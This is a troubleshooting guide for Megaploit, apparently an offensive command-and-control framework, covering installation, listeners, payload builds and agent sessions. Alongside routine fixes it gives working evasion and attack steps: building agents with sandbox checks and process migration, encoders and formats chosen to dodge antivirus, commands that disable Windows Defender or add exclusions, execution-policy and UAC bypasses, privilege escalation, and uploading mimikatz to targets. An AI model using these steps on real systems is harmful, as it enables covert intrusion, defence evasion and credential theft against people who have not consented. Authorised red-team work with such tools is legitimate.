# Megaploit Troubleshooting Guide

> Solutions to the most common problems encountered when installing, running, or using Megaploit.

---

## Table of Contents

1. [Installation Problems](#1-installation-problems)
2. [Server Won't Start](#2-server-wont-start)
3. [Payload Generation Errors](#3-payload-generation-errors)
4. [No Session After Running Payload](#4-no-session-after-running-payload)
5. [Session Opens Then Immediately Dies](#5-session-opens-then-immediately-dies)
6. [Commands Not Working in Session](#6-commands-not-working-in-session)
7. [File Upload / Download Failures](#7-file-upload--download-failures)
8. [Antivirus Killing the Payload](#8-antivirus-killing-the-payload)
9. [Firewall / NAT Issues](#9-firewall--nat-issues)
10. [Database Errors](#10-database-errors)
11. [Module / Exploit Errors](#11-module--exploit-errors)
12. [SSL / HTTPS Transport Issues](#12-ssl--https-transport-issues)
13. [Windows-Specific Issues](#13-windows-specific-issues)
14. [Linux-Specific Issues](#14-linux-specific-issues)
15. [Getting More Help](#15-getting-more-help)

---

## 1. Installation Problems

### `ModuleNotFoundError: No module named 'megaploit'`

**Cause:** Python can't find the package — either it wasn't installed or you are in the wrong environment.

```bash
# Check which Python you're running
which python3
python3 --version

# Activate your virtual environment (if you used one)
source venv/bin/activate

# Re-install dependencies
pip install -r requirements.txt

# Verify
python3 -c "import megaploit; print('OK')"
```

---

### `pip install` fails with permission errors

```bash
# Option 1 — use --user flag (no sudo needed)
pip install --user -r requirements.txt

# Option 2 — use a virtual environment (recommended)
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

---

### `pip install` fails with SSL/TLS errors

```bash
# Upgrade pip and certificates first
pip install --upgrade pip certifi

# If behind a proxy
pip install --proxy http://user:pass@proxy:8080 -r requirements.txt
```

---

### `ERROR: Could not find a version that satisfies the requirement ...`

Check the exact Python version needed:

```bash
python3 --version
# Must be 3.8 or newer

# If you have multiple Python versions installed, be explicit
python3.10 -m pip install -r requirements.txt
```

---

### Git clone fails (`unable to access`)

```bash
# Try SSH instead of HTTPS
git clone git@github.com:Josefifir/Megaploit.git

# Or download the ZIP directly from GitHub and extract
```

---

## 2. Server Won't Start

### `Address already in use` / `OSError: [Errno 98]`

**Cause:** Another process is already listening on that port.

```bash
# Find what is using port 4444
sudo lsof -i :4444
# or
sudo ss -tlnp | grep 4444

# Kill the process (replace PID with the actual number)
sudo kill -9 <PID>

# Or just use a different port
python3 -m megaploit --port 5555
```

---

### `Permission denied` on port 443 or 80

Ports below 1024 require root on Linux:

```bash
# Run as root
sudo python3 -m megaploit --port 443

# OR use a high port and redirect with iptables (no root in runtime)
sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 4444
python3 -m megaploit --port 4444
```

---

### Server starts but shows `[!] Warning: running as root`

This is a warning, not an error. It is safe to ignore in a controlled lab. For production engagements, run as a non-root user where possible.

---

### `ImportError` or `SyntaxError` at startup

```bash
# Check that all dependencies are installed
pip install -r requirements.txt

# Check for a corrupted install
pip install --force-reinstall -r requirements.txt
```

---

## 3. Payload Generation Errors

### `Error: LHOST is not reachable from target`

This is only a warning — Megaploit cannot verify connectivity at generation time. The payload was still created. Make sure:

1. Your LHOST IP is the IP the **target** can reach (not 127.0.0.1).
2. The port is open and Megaploit is listening.

```bash
# Check your IP addresses
ip addr show
# or
ifconfig

# Common mistake: using the loopback address
# WRONG:  LHOST = 127.0.0.1
# RIGHT:  LHOST = 192.168.1.50  (your actual LAN IP)
```

---

### `Error generating EXE: wine not found`

EXE payloads on Linux require Wine:

```bash
# Install Wine on Kali / Ubuntu
sudo dpkg --add-architecture i386
sudo apt-get update
sudo apt-get install wine wine32

# Verify
wine --version
```

---

### `Error: mingw-w64 not found` (cross-compilation)

```bash
sudo apt-get install mingw-w64
```

---

### Generated payload is 0 bytes

```bash
# Check for errors in the output — there was likely a silent failure
python3 -m megaploit --debug
# Then regenerate the payload
```

---

### Payload generation hangs

Press `Ctrl+C` to cancel. Then:

```bash
# Run with --debug to see where it stalls
python3 -m megaploit --debug
```

---

## 4. No Session After Running Payload

This is the most common issue. Work through these checks in order.

### Step 1 — Confirm Megaploit is actually listening

```bash
# Linux / macOS
ss -tlnp | grep 4444
# Should show:  LISTEN  0  10  0.0.0.0:4444

# Windows (PowerShell)
netstat -ano | Select-String ":4444"
```

If nothing shows, Megaploit is not running or crashed. Restart it with:

```bash
python server.py -lh <your-ip> -p 4444
```

---

### Step 2 — Check the audit log

The audit log at `loot/audit.log` records every connection attempt. Look at the
last few lines immediately after running the agent:

```bash
# Linux / macOS
tail -20 loot/audit.log

# Windows PowerShell
Get-Content loot\audit.log -Tail 20
```

| What you see | Meaning |
|---|---|
| `LISTEN bind=0.0.0.0:4444` | Server started correctly |
| `ACCEPTED ip=... session=N` | ✅ Agent connected — run `sessions` in the console |
| `REJECTED reason=auth_failed` | **Key mismatch** — see Step 5 |
| `REJECTED reason=tls_error` | TLS handshake failed — see Step 6 |
| `BLOCKED reason=not_in_allowlist` | Agent IP is not in `--allow-ip` list |
| Nothing after `LISTEN` | TCP never reached the server — see Step 3 |

---

### Step 3 — Confirm the target can reach your machine

From the **target**, test connectivity:

```bash
# From Linux target
nc -zv 192.168.1.50 4444   # should say "succeeded"

# From Windows target (PowerShell)
Test-NetConnection -ComputerName 192.168.1.50 -Port 4444
# TcpTestSucceeded: True  ← good
# TcpTestSucceeded: False ← firewall or wrong IP/port
```

---

### Step 4 — Check your firewall

```bash
# Kali / Ubuntu — allow incoming on the listener port
sudo ufw allow 4444/tcp
sudo ufw status

# If using iptables directly
sudo iptables -I INPUT -p tcp --dport 4444 -j ACCEPT
```

---

### Step 5 — Key mismatch (`auth_failed` in audit log)

The HMAC authentication uses a shared 32-byte secret. Both sides must have the
**identical** key.

**For the C agent (external build):**

1. The key is embedded in the binary at build time via `SECRET_KEY=<hex>`.
2. The server reads `secret.key` from the repo root at startup.
3. They must contain the same hex string.

**Fix:**

```bash
# From inside C-remote-shell/
python tools/gen_key.py
# Copy the printed hex to secret.key in the Megaploit repo root:
echo -n "<hex>" > ../secret.key       # Linux / macOS
Set-Content -NoNewline ..\secret.key "<hex>"  # Windows PowerShell

# Rebuild the agent with the same key:
mingw32-make C2_IP=<your-ip> C2_PORT=4444 SECRET_KEY=<hex>
```

---

### Step 6 — TLS handshake failure (`tls_error` in audit log)

The C agent always performs a SChannel TLS handshake before sending anything.
The server must present a TLS certificate or the agent's `ClientHello` is
misread as an HMAC response, which always fails.

The server auto-generates a certificate at `loot/tls/megaploit.crt` on first
start. If those files are corrupt or missing:

```bash
# Delete and let the server regenerate them
rm -rf loot/tls/
python server.py -lh <your-ip> -p 4444
```

---

### Step 7 — Confirm C2_IP and C2_PORT in the binary match the server

The IP and port are baked into the binary at compile time. If your server's IP
changed since the last build, **rebuild** with the correct address:

```bash
mingw32-make C2_IP=<new-ip> C2_PORT=4444 SECRET_KEY=<hex>
```

---

### Step 8 — Check if you're behind NAT (home router / cloud VM)

If you are behind a NAT router:

- Your LAN IP (e.g., `192.168.1.50`) is **only** reachable from the same LAN.
- For internet-facing payloads, use your **public IP** and set up **port forwarding** on your router.

```bash
# Find your public IP
curl ifconfig.me
```

Or use a **VPS** as the listener (no NAT issues):

```bash
# On VPS with public IP 203.0.113.10
python server.py -lh 203.0.113.10 -p 4444
# Build the agent with C2_IP=203.0.113.10
```

---

### Step 9 — C agent: sandbox check silently exiting

The C agent checks 10 sandbox/VM/debugger heuristics and exits silently if any
fire. To bypass all of them during testing, build with `DBG=1`:

```bash
# from C-remote-shell/
mingw32-make C2_IP=<your-ip> C2_PORT=4444 DBG=1
```

`DBG=1` also disables the 15–25 s startup delay and auto-migration, so the
agent connects immediately without relocating into another process.

---

### Step 10 — Check the payload actually ran

On the target, check for errors:

```bash
# Windows — check the application event log
# (Win+R → eventvwr.msc → Windows Logs → Application)

# Linux
journalctl -xe | tail -40
```

---

## 5. Session Opens Then Immediately Dies

### Antivirus killed it

The most common cause. See [Section 8](#8-antivirus-killing-the-payload).

---

### Network timeout — connection is too slow

For targets over high-latency links, increase the keep-alive timeout:

```
megaploit > set SessionKeepAlive 60
```

---

### Payload ran as a user without execute permission

Ensure the payload has execute permission on Linux:

```bash
chmod +x ./agent
./agent
```

---

### The payload process exited

Try running the payload in a persistent way:

```bash
# Linux — keep running in background after terminal closes
nohup ./agent &

# Windows — run minimised
start /min payload.exe
```

---

## 6. Commands Not Working in Session

### `Error: session is not responding`

The target may have lost connectivity. Check:

```
[session-1] > ping
# If no response: session is dead
megaploit > sessions    # session-1 may show as [dead]
```

Deliver a new payload and create a fresh session.

---

### `Permission denied` when running commands

You do not have enough privileges. Try:

```bash
[session-1] > getprivs       # see your current privileges
[session-1] > getsystem      # attempt auto privilege escalation
```

Or run the module:

```
megaploit > use post/suggest_exploit
megaploit > set SESSION session-1
megaploit > run
```

---

### `shell` command output is garbled / encoding issues

```bash
# Force UTF-8 on Windows
[session-1] > shell chcp 65001 && <your command>

# Or use the powershell command instead of shell
[session-1] > powershell [Console]::OutputEncoding = [System.Text.Encoding]::UTF8; <your command>
```

---

### Commands run but produce no output

Some commands are fire-and-forget (no output by design). For shell commands, always prefix with `shell`:

```bash
# Wrong — this runs as a Megaploit command (unknown)
[session-1] > ipconfig

# Right — this runs as a system command
[session-1] > shell ipconfig
```

---

## 7. File Upload / Download Failures

### `Error: file not found` during upload

The path must be relative to where you launched Megaploit, or use an absolute path:

```bash
# Absolute path — always works
[session-1] > upload /root/tools/mimikatz.exe C:\Temp\m.exe

# Relative path — relative to your CWD when you started Megaploit
[session-1] > upload tools/mimikatz.exe C:\Temp\m.exe
```

---

### Upload/download stalls at 0%

Check available disk space on the target:

```bash
[session-1] > shell dir C:\     # Windows
[session-1] > shell df -h /     # Linux
```

Also check your network connection — large file transfers over slow links can appear to stall.

---

### `Access denied` when writing to target path

Try a path the current user has write access to:

```bash
# Windows — usually writable locations
C:\Temp\
C:\Users\<username>\AppData\Local\Temp\
C:\Users\<username>\Desktop\

# Linux — usually writable
/tmp/
/var/tmp/
~/ (home directory)
```

---

## 8. Antivirus Killing the Payload

### Windows Defender removes the file on download

The payload was detected before it could run. Options:

**Option 1 — Use an encoder**

```
megaploit > generate
[?] Encoder: xor_b64
```

**Option 2 — Stack multiple encoders**

```
megaploit > generate
[?] Encoder: xor_b64,aes256
```

**Option 3 — Use a different payload format**

Formats that are often less detected:
- `ps1` (PowerShell) — runs from memory, no file written
- `py` (Python) — interpreted, harder for AV to static-scan
- `hta` (HTML Application) — abuses legitimate Windows feature

```
megaploit > generate
[?] Payload format: ps1
```

**Option 4 — Disable Windows Defender temporarily** (for authorised testing)

```powershell
# Run as Administrator on the target
Set-MpPreference -DisableRealtimeMonitoring $true
```

**Option 5 — Use exclusion path** (for authorised testing)

```powershell
Add-MpPreference -ExclusionPath "C:\Temp"
# Then place and run the payload from C:\Temp
```

---

### AV killed the process mid-session

The session will die. Options:
1. Migrate to a less suspicious process before AV catches up:

```bash
[session-1] > ps                              # list processes
[session-1] > migrate <PID of explorer.exe>  # migrate into explorer
```

2. Regenerate with a more evasive encoder and re-deliver.

---

## 9. Firewall / NAT Issues

### Can't connect from internet to your listener

1. **Find your public IP:** `curl ifconfig.me`
2. **Set up port forwarding on your router:**
   - Forward TCP `<LPORT>` → your machine's LAN IP
3. **Generate payload with your PUBLIC IP as LHOST**

---

### Cloud VM (AWS/GCP/Azure) — security group must allow inbound

In your cloud provider's console, add an inbound rule:
- Protocol: TCP
- Port: your LPORT (e.g., 4444)
- Source: 0.0.0.0/0 (or restrict to target IP)

---

### Payload is connecting but being dropped silently

Some corporate firewalls do deep packet inspection (DPI). Try:

```bash
# Use port 443 (HTTPS) — often allowed through firewalls
python3 -m megaploit --port 443 --ssl

# Generate payload with LPORT=443
```

---

## 10. Database Errors

### `sqlite3.OperationalError: unable to open database file`

```bash
# Check the database path
python3 -m megaploit --db-path /tmp/megaploit.db

# Or fix permissions on the default path
chmod 755 ~/.megaploit/
```

---

### `database is locked`

Another Megaploit instance is running and has the database locked:

```bash
# Find other instances
ps aux | grep megaploit

# Kill them
kill <PID>

# Then restart
python3 -m megaploit
```

---

### Database corruption — `malformed database disk image`

```bash
# Backup and reset the database
cp megaploit.db megaploit.db.bak
sqlite3 megaploit.db "PRAGMA integrity_check;"

# If corrupted, start fresh
rm megaploit.db
python3 -m megaploit   # creates a new clean database
```

---

## 11. Module / Exploit Errors

### `Module not found: post/suggest_exploit`

```bash
# List all available modules
megaploit > search module

# Check spelling — module names are case-sensitive in some versions
megaploit > use post/Suggest_Exploit   # try different capitalisation
```

---

### `Error: required option SESSION not set`

```bash
# Always set SESSION before running a post-exploitation module
megaploit > set SESSION session-1
megaploit > run
```

---

### Module runs but returns no results

- Ensure the session is still alive: `megaploit > sessions`
- Ensure you have sufficient privileges for what the module does:

```bash
[session-1] > getprivs
[session-1] > getsystem    # if you need higher privs
```

---

## 12. TLS / HTTPS Transport Issues

### The C agent never connects — `tls_error` in audit log

The C agent performs a SChannel TLS handshake before any authentication. The
server **must** have TLS enabled or the handshake fails immediately.

Starting the server without any flags now enables TLS automatically:

```bash
python server.py -lh <your-ip> -p 4444
# Prints: [+] TLS auto-cert (required for C agent) → loot/tls/megaploit.crt
```

If the cert files are corrupt, delete them and let the server regenerate:

```bash
rm -rf loot/tls/
python server.py -lh <your-ip> -p 4444
```

---

### Bringing your own certificate

```bash
python server.py -lh <your-ip> -p 4444 --cert cert.pem --key key.pem
```

To generate a self-signed certificate manually:

```bash
openssl req -x509 -newkey rsa:3072 -keyout key.pem -out cert.pem -days 365 -nodes \
  -subj "/CN=<your-ip>"

python server.py -lh <your-ip> -p 4444 --cert cert.pem --key key.pem
```

---

### Optional: pin the server certificate in the C agent

To reject SSL-inspection proxies, embed the cert's SHA-256 fingerprint at build
time:

```bash
openssl x509 -in loot/tls/megaploit.crt -noout -fingerprint -sha256
# prints: SHA256 Fingerprint=AA:BB:CC:... — strip colons to get 64 hex chars

mingw32-make C2_IP=<ip> SECRET_KEY=<hex> C2_CERT_PIN=<64-hex-fingerprint>
```

---

## 13. Windows-Specific Issues

### PowerShell execution policy blocks the PS1 payload

```powershell
# On the target, run as Administrator
Set-ExecutionPolicy Bypass -Scope Process -Force

# Then run the payload
.\run.ps1
```

Or use the bypass inline:

```powershell
powershell.exe -ExecutionPolicy Bypass -File run.ps1
```

---

### `This app can't run on your PC` — wrong architecture

You built a 64-bit EXE but the target is 32-bit (or vice versa).

```bash
# Generate 32-bit EXE explicitly
megaploit > generate
[?] Payload format: exe32
```

---

### UAC prompt blocks execution

The payload needs Administrator rights and UAC is stopping it:

```bash
# Use a payload format that doesn't trigger UAC
# Options: ps1 (PowerShell), hta, or a non-admin-requiring format

# Or after getting a low-priv session, run the UAC bypass module
megaploit > use post/bypassuac
megaploit > set SESSION session-1
megaploit > run
```

---

## 14. Linux-Specific Issues

### `exec format error` when running the ELF payload

The ELF was compiled for the wrong architecture:

```bash
# Check target architecture
uname -m
# x86_64 → use elf (64-bit)
# i686   → use elf32 (32-bit)
# aarch64 → use elf_arm64

# Regenerate with the correct format
megaploit > generate
[?] Payload format: elf_arm64
```

---

### `Text file busy` — can't execute the payload

```bash
cp ./agent /tmp/agent2
chmod +x /tmp/agent2
/tmp/agent2
```

---

### SELinux blocking execution in `/tmp`

```bash
# Check SELinux status
getenforce
# If "Enforcing", use a different directory
cp ./agent ~/agent
chmod +x ~/agent
~/agent
```

---

## 15. Getting More Help

### Enable debug logging

```bash
python3 -m megaploit --debug 2>&1 | tee megaploit_debug.log
```

This prints verbose output and saves it to a log file — very useful when reporting issues.

### In-app help

```
megaploit > help                  # list all global commands
megaploit > help generate         # help for a specific command
[session-1] > help                # list all session commands
[session-1] > help download       # help for a specific session command
```

### Check the other docs

| Problem area | Guide |
|---|---|
| Payload not detected | [`docs/PAYLOAD_BUILDER.md`](PAYLOAD_BUILDER.md) |
| Pivoting / networking | [`docs/NETWORKING.md`](NETWORKING.md) |
| Module errors | [`docs/MODULE_SYSTEM.md`](MODULE_SYSTEM.md) |
| Full command reference | [`docs/CLI_REFERENCE.md`](CLI_REFERENCE.md) |
| Beginner walkthrough | [`docs/QUICKSTART.md`](QUICKSTART.md) |

### Open a GitHub issue

If the problem persists, open an issue at:  
**https://github.com/Josefifir/Megaploit/issues**

Include:
- Your OS and Python version
- The exact command you ran
- The full error message
- The output of `python3 -m megaploit --debug`
